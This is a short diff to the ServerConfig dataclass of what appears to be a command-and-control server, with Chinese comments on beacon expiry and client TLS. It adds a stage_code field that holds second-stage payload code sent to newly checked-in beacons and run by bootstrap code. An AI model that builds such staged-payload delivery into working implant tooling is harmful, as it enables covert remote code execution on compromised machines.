@@ -58,6 +58,7 @@ class ServerConfig:
     beacon_expire_seconds: int = 86400  # beacon 过期清理时限（秒，默认 1 天；超时未回连即移除）
     client_tls: bool = False         # client 远程通道启用 TLS（防嗅探）
     auto_commands: list = field(default_factory=list)
+    stage_code: str = ""           # 分段载荷第二段代码(stage 命令设定;新 beacon 首次上线下发, 引导代码 exec)
     base_dir: str = ""               # 配置文件所在目录（load_config 设置）
     config_path: str = ""            # 配置文件绝对路径（load_config 设置，reload 用）
 
